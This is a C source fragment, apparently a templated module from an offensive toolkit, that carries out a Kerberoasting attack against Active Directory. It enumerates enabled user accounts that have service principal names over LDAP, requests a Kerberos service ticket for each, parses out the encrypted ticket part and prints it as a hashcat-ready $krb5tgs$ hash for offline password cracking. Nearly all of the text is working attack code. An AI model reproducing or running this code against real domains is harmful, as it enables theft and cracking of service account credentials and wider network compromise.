LDAP *ld = NULL;
LDAPMessage *pRes = NULL;
LDAPMessage *pEntry = NULL;
int spnCount = 0;

WCHAR baseDN[512];
{
    const WCHAR *dom = L"{{ domain }}";
    WCHAR *dst = baseDN;
    const WCHAR *src = dom;
    int first = 1;
    while (*src) {
        if (first) { dst += wsprintfW(dst, L"DC="); first = 0; }
        const WCHAR *dot = src;
        while (*dot && *dot != L'.') dot++;
        while (src < dot) *dst++ = *src++;
        if (*src == L'.') { dst += wsprintfW(dst, L",DC="); src++; }
    }
    *dst = 0;
}

ld = {{ WINAPI("ldap_initW") }}(L"{{ domain }}", 389);
if (!ld) { wprintf(L"[-] ldap_init failed\n"); return; }

ULONG rc = {{ WINAPI("ldap_bind_sW") }}(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
if (rc != LDAP_SUCCESS) { wprintf(L"[-] ldap_bind_s failed: %u\n", rc); goto ldap_done; }

PWCHAR attrs[] = { L"sAMAccountName", L"servicePrincipalName", NULL };
rc = {{ WINAPI("ldap_search_sW") }}(ld, baseDN, LDAP_SCOPE_SUBTREE,
    L"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
    attrs, 0, &pRes);
if (rc != LDAP_SUCCESS) { wprintf(L"[-] ldap_search_s failed: %u\n", rc); goto ldap_done; }

for (pEntry = ldap_first_entry(ld, pRes); pEntry; pEntry = ldap_next_entry(ld, pEntry)) {
    PWCHAR *samVals = ldap_get_valuesW(ld, pEntry, L"sAMAccountName");
    PWCHAR *spnVals = ldap_get_valuesW(ld, pEntry, L"servicePrincipalName");
    if (!samVals || !spnVals) {
        if (samVals) ldap_value_freeW(samVals);
        if (spnVals) ldap_value_freeW(spnVals);
        continue;
    }

    WCHAR *userName = samVals[0];

    for (int si = 0; spnVals[si]; si++) {
        WCHAR *spn = spnVals[si];
        CredHandle hCred;
        CtxtHandle hCtx;
        SecBufferDesc outDesc;
        SecBuffer outBuf;
        TimeStamp tsExpiry;
        ULONG fAttr;
        SECURITY_STATUS ss;

        ZeroMemory(&hCred, sizeof(hCred));
        ZeroMemory(&hCtx, sizeof(hCtx));

        ss = {{ WINAPI("AcquireCredentialsHandleW") }}(NULL, L"Kerberos",
            SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCred, &tsExpiry);
        if (ss != SEC_E_OK) continue;

        outBuf.cbBuffer = 0;
        outBuf.BufferType = SECBUFFER_TOKEN;
        outBuf.pvBuffer = NULL;
        outDesc.ulVersion = SECBUFFER_VERSION;
        outDesc.cBuffers = 1;
        outDesc.pBuffers = &outBuf;

        ss = {{ WINAPI("InitializeSecurityContextW") }}(&hCred, NULL, spn,
            ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
            0, SECURITY_NATIVE_DREP, NULL, 0, &hCtx, &outDesc, &fAttr, &tsExpiry);

        if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
            unsigned char *blob = (unsigned char *)outBuf.pvBuffer;
            int blobLen = outBuf.cbBuffer;
            unsigned char *end = blob + blobLen;

            if (blob && blobLen > 0) {
                unsigned char *p = blob;
                int olen;

                // Skip APPLICATION 14 tag (0x6e)
                if (*p == 0x6e) { p++; asn1_rlen(&p, end); }
                // Enter SEQUENCE
                if (*p == 0x30) { p++; asn1_rlen(&p, end); }
                // Find [3] = ticket
                unsigned char *ticket = asn1_find(p, end, 0xa3, &olen);
                if (ticket) {
                    unsigned char *tend = ticket + olen;
                    unsigned char *tp = ticket;
                    // Skip APPLICATION 1 (0x61)
                    if (*tp == 0x61) { tp++; asn1_rlen(&tp, tend); }
                    // Enter SEQUENCE
                    if (*tp == 0x30) { tp++; asn1_rlen(&tp, tend); }
                    // Find [1] = realm
                    int realmLen;
                    unsigned char *realmTag = asn1_find(tp, tend, 0xa1, &realmLen);
                    char realm[256] = {0};
                    if (realmTag) {
                        unsigned char *rp = realmTag;
                        unsigned char *re = realmTag + realmLen;
                        int gsLen;
                        // GeneralString inside the tag
                        unsigned char *gs = asn1_find(rp, re, 0x1b, &gsLen);
                        if (gs && gsLen < 255) { memcpy(realm, gs, gsLen); realm[gsLen] = 0; }
                    }
                    // Find [3] = enc-part
                    int epLen;
                    unsigned char *encPart = asn1_find(tp, tend, 0xa3, &epLen);
                    if (encPart) {
                        unsigned char *ep = encPart;
                        unsigned char *ee = encPart + epLen;
                        // Enter SEQUENCE
                        if (*ep == 0x30) { ep++; asn1_rlen(&ep, ee); }
                        // [0] = etype
                        int etypeLen;
                        unsigned char *etypeTag = asn1_find(ep, ee, 0xa0, &etypeLen);
                        int etype = -1;
                        if (etypeTag) etype = asn1_int(etypeTag, etypeTag + etypeLen);
                        // [2] = cipher
                        int cipherLen;
                        unsigned char *cipherTag = asn1_find(ep, ee, 0xa2, &cipherLen);
                        if (cipherTag && etype > 0) {
                            unsigned char *cp = cipherTag;
                            unsigned char *ce = cipherTag + cipherLen;
                            int rawLen;
                            unsigned char *cipher = asn1_find(cp, ce, 0x04, &rawLen);
                            if (cipher && rawLen > 16) {
                                wprintf(L"$krb5tgs$%d$*%s$%S$%s*$", etype, userName, realm, spn);
                                for (int i = 0; i < 16; i++) wprintf(L"%02x", cipher[i]);
                                wprintf(L"$");
                                for (int i = 16; i < rawLen; i++) wprintf(L"%02x", cipher[i]);
                                wprintf(L"\n");
                                spnCount++;
                            }
                        }
                    }
                }
            }
        }

        if (outBuf.pvBuffer) {{ WINAPI("FreeContextBuffer") }}(outBuf.pvBuffer);
        {{ WINAPI("DeleteSecurityContext") }}(&hCtx);
        {{ WINAPI("FreeCredentialsHandle") }}(&hCred);

        break; // one SPN per account is enough for cracking
    }

    ldap_value_freeW(spnVals);
    ldap_value_freeW(samVals);
}

wprintf(L"\n[+] Kerberoasting complete. %d hash(es) retrieved.\n", spnCount);

ldap_done:
if (pRes) ldap_msgfree(pRes);
if (ld) {{ WINAPI("ldap_unbind") }}(ld);
